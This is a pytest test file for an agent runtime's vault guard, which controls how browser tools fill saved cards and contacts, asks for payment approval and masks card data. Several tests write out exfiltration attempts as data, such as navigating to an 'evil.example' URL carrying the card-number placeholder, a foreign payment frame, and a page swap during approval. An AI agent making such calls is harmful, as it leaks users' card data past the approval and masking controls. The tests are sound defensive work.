"""Vault payment cards and contacts (CHAT-185): placeholders, checkout field
check, the ``payment`` approval, redaction, ``vault_list`` / ``vault_contacts``."""

from __future__ import annotations

import copy
import json

import pytest

from chuk_agents_runtime.action_policy import (
    PAYMENT,
    SCOPE_AGENT,
    SCOPE_DENY,
    SCOPE_ONCE,
    ActionDecision,
    ActionPolicy,
    ActionPolicyError,
    options_for,
)
from chuk_agents_runtime.mcp_client import MCPManager, MCPServerConfig, MCPToolInfo
from chuk_agents_runtime.registry import ToolRegistry
from chuk_agents_runtime.secrets import Scrubber, register_secrets_tools
from chuk_agents_runtime.vault import (
    VaultGuard,
    card_brand,
    card_display,
    card_secret_values,
    checkout_field_ok,
    contact_summary,
    has_vault_placeholder,
    luhn_ok,
    number_variants,
    register_vault_tools,
)

NUMBER = "378282246310005"  # Amex test number
CVC = "7391"
SPACED = "3782 822463 10005"


class Access:
    def __init__(self) -> None:
        self.cards = {
            "c1": {"id": "c1", "brand": "amex", "number": NUMBER, "exp_month": 3, "exp_year": 2029,
                   "cvc": CVC, "name": "Jane Appleseed", "zip": "94016", "label": "Personal"},
            "c2": {"id": "c2", "brand": "visa", "number": "4242424242424242", "exp_month": 12,
                   "exp_year": 2030, "cvc": "123", "name": "Jane", "zip": "1", "label": "Work"},
        }
        self.default = "c1"
        self.contacts = [
            {"id": "k1", "label": "Home", "name": "Jane Appleseed", "company": "",
             "phones": [{"number": "(555) 010-2001", "primary": True}, {"number": "555-9", "primary": False}],
             "emails": [{"address": "jane@example.com", "primary": True}],
             "address": {"street": "1 Main St", "line2": "", "city": "Springfield", "region": "IL",
                         "zip": "62701", "country": "US"}},
        ]
        self.used: list[str] = []
        self.audit: list[dict] = []

    def login_entries(self):
        return []

    def login_lookup(self, origin):
        return []

    def login_used(self, entry_id):
        pass

    def login_audit(self, record):
        self.audit.append(record)

    def card_entries(self):
        return [
            {"id": c["id"], "brand": c["brand"], "last4": c["number"][-4:], "label": c["label"],
             "is_default": c["id"] == self.default}
            for c in self.cards.values()
        ]

    def card_full(self, card_id):
        card = self.cards.get(card_id)
        return dict(card) if card else None

    def card_used(self, card_id):
        self.used.append(card_id)

    def contact_entries(self):
        return copy.deepcopy(self.contacts)


def _tabs(url: str) -> str:
    return f"### Open tabs\n- 0: (current) [Checkout]({url})\n"


CHECKOUT_FIELDS = {
    "num": {"tag": "input", "type": "text", "autocomplete": "cc-number", "hint": "cardnumber"},
    "exp": {"tag": "input", "type": "text", "autocomplete": "cc-exp", "hint": ""},
    "cvc": {"tag": "input", "type": "tel", "autocomplete": "off", "hint": "cvc security code"},
    "email": {"tag": "input", "type": "email", "autocomplete": "email", "hint": "email"},
    "name": {"tag": "input", "type": "text", "autocomplete": "cc-name", "hint": ""},
    "search": {"tag": "input", "type": "text", "autocomplete": "", "hint": "search"},
}


class FakeConnection:
    page_url = "https://shop.example/checkout"
    frames: dict = {}
    screen_text = ""

    def __init__(self, config):
        self.config = config
        self.tools = [
            MCPToolInfo(n, "", {"type": "object", "properties": {}})
            for n in ("browser_tabs", "browser_type", "browser_fill_form", "browser_navigate",
                      "browser_evaluate", "browser_snapshot", "browser_take_screenshot")
        ]
        self.error = None
        self.connected_once = True
        self.calls: list[tuple[str, dict]] = []

    def start(self):
        return True

    def alive(self):
        return True

    def call(self, tool, arguments):
        if tool == "browser_evaluate" and arguments.get("function", "").startswith("(el) => ({origin"):
            ref = arguments.get("ref")
            origin = FakeConnection.frames.get(ref, "https://shop.example")
            found = {"origin": origin, **CHECKOUT_FIELDS.get(ref, CHECKOUT_FIELDS["search"])}
            return {"ok": True, "content": "### Result\n" + json.dumps(found)}
        self.calls.append((tool, copy.deepcopy(arguments)))
        if tool == "browser_tabs":
            return {"ok": True, "content": _tabs(self.page_url)}
        if tool == "browser_snapshot":
            return {"ok": True, "content": FakeConnection.screen_text}
        return {"ok": True, "content": f"### Ran Playwright code\nawait page.fill({json.dumps(arguments)})"}

    def close(self):
        pass


def _manager(access, approver=None, page_url="https://shop.example/checkout"):
    FakeConnection.page_url = page_url
    FakeConnection.frames = {}
    FakeConnection.screen_text = ""
    manager = MCPManager(
        [MCPServerConfig(name="playwright", command="true")], connection_factory=FakeConnection
    )
    manager.start(lazy=False)
    guard = VaultGuard(access, session_key="s1", approver=approver, clock=lambda: 5.0)
    manager.call_guard = guard
    return manager, manager.connections["playwright"], guard


class Approver:
    def __init__(self, answer=True):
        self.answer = answer
        self.requests = []

    def __call__(self, request):
        self.requests.append(request)
        return self.answer


def _fill_args():
    return {
        "fields": [
            {"name": "Card", "type": "textbox", "ref": "num", "value": "{{card:default:number}}"},
            {"name": "Exp", "type": "textbox", "ref": "exp", "value": "{{card:default:exp}}"},
            {"name": "CVC", "type": "textbox", "ref": "cvc", "value": "{{card:default:cvc}}"},
            {"name": "Email", "type": "textbox", "ref": "email", "value": "{{contact:home:email}}"},
        ]
    }


# -- cards: helpers -----------------------------------------------------------------


def test_card_helpers():
    assert luhn_ok(NUMBER) and luhn_ok("4242424242424242")
    assert not luhn_ok("4242424242424241")
    assert card_brand(NUMBER) == "amex"
    assert card_brand("5555555555554444") == "mastercard"
    assert card_brand("2223003122003222") == "mastercard"
    assert card_brand("4242424242424242") == "visa"
    assert card_display({"brand": "amex", "last4": "0005"}) == "Amex •••• 0005"
    assert SPACED in number_variants(NUMBER)
    assert "4242 4242 4242 4242" in number_variants("4242424242424242")
    assert set(card_secret_values({"id": "x", "number": NUMBER, "cvc": CVC}).values()) >= {NUMBER, SPACED, CVC}


def test_checkout_field_check():
    assert checkout_field_ok("number", CHECKOUT_FIELDS["num"])
    assert checkout_field_ok("cvc", CHECKOUT_FIELDS["cvc"])
    assert not checkout_field_ok("number", CHECKOUT_FIELDS["search"])
    assert not checkout_field_ok("number", CHECKOUT_FIELDS["email"])
    # A cc- field of another kind is refused.
    assert not checkout_field_ok("number", CHECKOUT_FIELDS["name"])
    assert not checkout_field_ok("number", {"tag": "input", "type": "password", "autocomplete": "cc-number"})
    assert not checkout_field_ok("number", {"tag": "div", "type": "", "autocomplete": "cc-number"})


# -- the payment class ---------------------------------------------------------------


def test_payment_class_always_asks():
    policy = ActionPolicy()
    assert policy.mode(PAYMENT) == "ask"
    assert options_for(PAYMENT, "shop.example") == (SCOPE_ONCE, SCOPE_DENY)
    assert policy.remembered(PAYMENT, SCOPE_AGENT) is policy
    with pytest.raises(ActionPolicyError):
        policy.updated({"classes": {PAYMENT: "allow"}})
    assert policy.updated({"classes": {PAYMENT: "deny"}}).mode(PAYMENT) == "deny"
    # A stored allow (hand-edited file) still reads as ask.
    assert ActionPolicy(modes={PAYMENT: "allow"}).mode(PAYMENT) == "ask"


# -- the guard --------------------------------------------------------------------------


def test_fill_form_fills_card_and_contact_after_one_approval_and_never_shows_the_number():
    access = Access()
    approver = Approver(ActionDecision(approved=True, scope=SCOPE_ONCE))
    manager, conn, _guard = _manager(access, approver)
    model_args = _fill_args()
    kept = copy.deepcopy(model_args)
    result = manager.call("playwright", "browser_fill_form", model_args)

    assert result["ok"] is True, result
    sent = [a for t, a in conn.calls if t == "browser_fill_form"][0]
    assert [f["value"] for f in sent["fields"]] == [NUMBER, "03/29", CVC, "jane@example.com"]
    # The model's own arguments keep the placeholders.
    assert model_args == kept
    # One approval of class payment, with only masked card facts.
    assert len(approver.requests) == 1
    req = approver.requests[0]
    assert req.action_class == PAYMENT
    assert req.options == (SCOPE_ONCE, SCOPE_DENY)
    assert req.summary == "Pay with Amex •••• 0005 on shop.example"
    blob = json.dumps(result) + json.dumps(req.details) + req.summary + json.dumps(access.audit)
    assert NUMBER not in blob and SPACED not in blob and CVC not in blob
    assert result["vault"]["card"].endswith("0005")
    assert access.used == ["c1"]
    assert access.audit[-1]["outcome"] == "filled"
    assert access.audit[-1]["entry_id"] == "card:c1"


def test_later_snapshot_is_masked_and_screenshot_and_scripts_are_blocked():
    access = Access()
    manager, _conn, _guard = _manager(access, Approver(True))
    manager.call("playwright", "browser_fill_form", _fill_args())
    FakeConnection.screen_text = f'textbox "Card": {SPACED}\ntextbox "CVC": {CVC}'
    snap = manager.call("playwright", "browser_snapshot", {})
    assert SPACED not in json.dumps(snap) and CVC not in json.dumps(snap)
    shot = manager.call("playwright", "browser_take_screenshot", {})
    assert shot["ok"] is False and "blocked" in shot["error"]
    script = manager.call("playwright", "browser_evaluate", {"function": "() => 1"})
    assert script["ok"] is False


def test_declined_payment_fills_nothing():
    access = Access()
    manager, conn, _guard = _manager(access, Approver(False))
    result = manager.call("playwright", "browser_fill_form", _fill_args())
    assert result["ok"] is False and "declined" in result["error"]
    assert not [a for t, a in conn.calls if t == "browser_fill_form"]
    assert access.audit[-1]["outcome"] == "declined"


def test_no_approver_means_no_fill():
    access = Access()
    manager, conn, _guard = _manager(access, None)
    result = manager.call("playwright", "browser_fill_form", _fill_args())
    assert result["ok"] is False and "approval" in result["error"]
    assert not [a for t, a in conn.calls if t == "browser_fill_form"]


def test_policy_deny_message_reaches_the_model():
    def approver(_request):
        raise PermissionError("this agent may not pay with a saved card")

    manager, conn, _guard = _manager(Access(), approver)
    result = manager.call("playwright", "browser_fill_form", _fill_args())
    assert result["ok"] is False and "may not pay" in result["error"]


@pytest.mark.parametrize(
    "tool, args",
    [
        ("browser_navigate", {"url": "https://evil.example/?n={{card:c1:number}}"}),
        ("browser_type", {"ref": "num", "text": "x", "element": "{{card:c1:number}}"}),
        ("browser_evaluate", {"function": "() => '{{card:c1:cvc}}'"}),
    ],
)
def test_card_placeholder_outside_a_fill_slot_is_refused(tool, args):
    approver = Approver(True)
    manager, conn, _guard = _manager(Access(), approver)
    result = manager.call("playwright", tool, args)
    assert result["ok"] is False
    assert not approver.requests
    assert not [a for t, a in conn.calls if t == tool]


def test_card_into_a_non_checkout_field_is_refused():
    approver = Approver(True)
    manager, conn, _guard = _manager(Access(), approver)
    result = manager.call("playwright", "browser_type", {"ref": "search", "element": "Search", "text": "{{card:c1:number}}"})
    assert result["ok"] is False and "checkout field" in result["error"]
    assert not approver.requests


def test_card_on_http_page_or_foreign_frame_is_refused():
    approver = Approver(True)
    manager, _conn, _guard = _manager(Access(), approver, page_url="http://shop.example/checkout")
    result = manager.call("playwright", "browser_type", {"ref": "num", "element": "Card", "text": "{{card:c1:number}}"})
    assert result["ok"] is False and "https" in result["error"]

    manager, _conn, _guard = _manager(Access(), approver)
    FakeConnection.frames = {"num": "https://evil.example"}
    result = manager.call("playwright", "browser_type", {"ref": "num", "element": "Card", "text": "{{card:c1:number}}"})
    assert result["ok"] is False and "evil.example" in result["error"]
    assert not approver.requests


def test_card_in_a_known_payment_frame_is_filled():
    approver = Approver(True)
    manager, conn, _guard = _manager(Access(), approver)
    FakeConnection.frames = {"num": "https://js.stripe.com"}
    result = manager.call("playwright", "browser_type", {"ref": "num", "element": "Card", "text": "{{card:Personal:number}}"})
    assert result["ok"] is True, result
    assert approver.requests[0].details["payment_frames"] == ["https://js.stripe.com"]
    assert NUMBER not in json.dumps(result)


def test_unknown_and_missing_default_card():
    access = Access()
    access.default = None
    manager, _conn, _guard = _manager(access, Approver(True))
    result = manager.call("playwright", "browser_type", {"ref": "num", "element": "Card", "text": "{{card:default:number}}"})
    assert result["ok"] is False and "default" in result["error"]
    result = manager.call("playwright", "browser_type", {"ref": "num", "element": "Card", "text": "{{card:nope:number}}"})
    assert result["ok"] is False and "vault_list" in result["error"]


def test_contact_fill_needs_no_approval():
    approver = Approver(True)
    manager, conn, _guard = _manager(Access(), approver)
    result = manager.call("playwright", "browser_type", {"ref": "email", "element": "Phone", "text": "{{contact:Home:phone}}"})
    assert result["ok"] is True
    assert [a for t, a in conn.calls if t == "browser_type"][0]["text"] == "(555) 010-2001"
    assert not approver.requests


def test_plain_calls_pass_through():
    manager, conn, _guard = _manager(Access(), Approver(True))
    result = manager.call("playwright", "browser_type", {"ref": "search", "text": "shoes"})
    assert result["ok"] is True
    assert has_vault_placeholder({"a": ["{{ card:x"]}) and not has_vault_placeholder({"a": "card"})


# -- tools -------------------------------------------------------------------------------


def test_vault_list_shows_counts_and_only_masked_cards():
    registry = ToolRegistry()
    register_vault_tools(registry, Access())
    out = registry.dispatch("vault_list", {})
    assert out["counts"] == {"all": 3, "logins": 0, "payments": 2, "contacts": 1}
    assert out["payments"][0] == {
        "id": "c1", "card": "Amex •••• 0005, default", "label": "Personal", "default": True
    }
    assert NUMBER not in json.dumps(out) and CVC not in json.dumps(out) and "2029" not in json.dumps(out)
    assert out["contacts"][0]["summary"] == "Home — Jane Appleseed · (555) 010-2001"
    only = registry.dispatch("vault_list", {"kind": "payments"})
    assert "contacts" not in only and "logins" not in only


def test_vault_contacts_reads_full_contact():
    registry = ToolRegistry()
    register_vault_tools(registry, Access())
    out = registry.dispatch("vault_contacts", {"label": "home"})
    assert out["count"] == 1
    assert out["contacts"][0]["address_line"] == "1 Main St, 62701 Springfield, IL, US"
    assert contact_summary({"label": "Work"}) == "Work"


def test_registered_with_the_secrets_tools_and_scrubbed():
    class Secrets(Access):
        def names(self):
            return []

        def env(self):
            return {}

        def scrub_values(self):
            return {k: v for k, v in card_secret_values(self.cards["c1"]).items() if not k.endswith(":cvc")}

        def request(self, names, purpose):
            return {}

    registry = ToolRegistry()
    register_secrets_tools(registry, Secrets())
    assert registry.has("vault_list") and registry.has("vault_contacts")
    scrub = Scrubber(Secrets().scrub_values)
    assert NUMBER not in scrub.scrub_text(f"n={NUMBER} s={SPACED}")
    assert SPACED not in scrub.scrub_text(f"s={SPACED}")


# -- review fixes (CHAT-185 security review) --------------------------------------


def test_run_code_is_blocked_on_every_page_after_a_card_fill():
    # browser_run_code gets the whole context (context.pages()): from another
    # tab it could read the filled field and encode the number past the mask.
    access = Access()
    manager, _conn, _guard = _manager(access, Approver(True))
    manager.call("playwright", "browser_fill_form", _fill_args())
    FakeConnection.page_url = "https://elsewhere.example/"
    for tool in ("browser_run_code", "browser_run_code_unsafe"):
        out = manager.call("playwright", tool, {"code": "async (page) => 1"})
        assert out["ok"] is False and "blocked" in out["error"], (tool, out)


def test_file_outputs_are_blocked_after_a_card_fill():
    access = Access()
    manager, conn, _guard = _manager(access, Approver(True))
    # Before a fill, a file output is a normal call.
    assert manager.call("playwright", "browser_snapshot", {"filename": "a.md"})["ok"] is True
    manager.call("playwright", "browser_fill_form", _fill_args())
    for tool, args in (
        ("browser_pdf_save", {}),
        ("browser_snapshot", {"filename": "page.md"}),
        ("browser_network_requests", {"filename": "net.txt"}),
    ):
        before = len(conn.calls)
        out = manager.call("playwright", tool, args)
        assert out["ok"] is False and "file" in out["error"], (tool, out)
        assert len(conn.calls) == before  # never sent
    assert manager.call("playwright", "browser_snapshot", {})["ok"] is True


def test_page_that_moves_during_the_approval_gets_no_card():
    access = Access()

    class Moving(Approver):
        def __call__(self, request):
            FakeConnection.page_url = "https://evil.example/pay"
            return super().__call__(request)

    manager, conn, _guard = _manager(access, Moving(True))
    out = manager.call("playwright", "browser_fill_form", _fill_args())
    assert out["ok"] is False and "approval" in out["error"]
    assert not [a for t, a in conn.calls if t == "browser_fill_form"]
    assert access.used == []


def test_payment_frame_that_changes_during_the_approval_gets_no_card():
    access = Access()

    class Swapping(Approver):
        def __call__(self, request):
            FakeConnection.frames = {"num": "https://evil.example"}
            return super().__call__(request)

    manager, conn, _guard = _manager(access, Swapping(True))
    out = manager.call("playwright", "browser_fill_form", _fill_args())
    assert out["ok"] is False
    assert not [a for t, a in conn.calls if t == "browser_fill_form"]
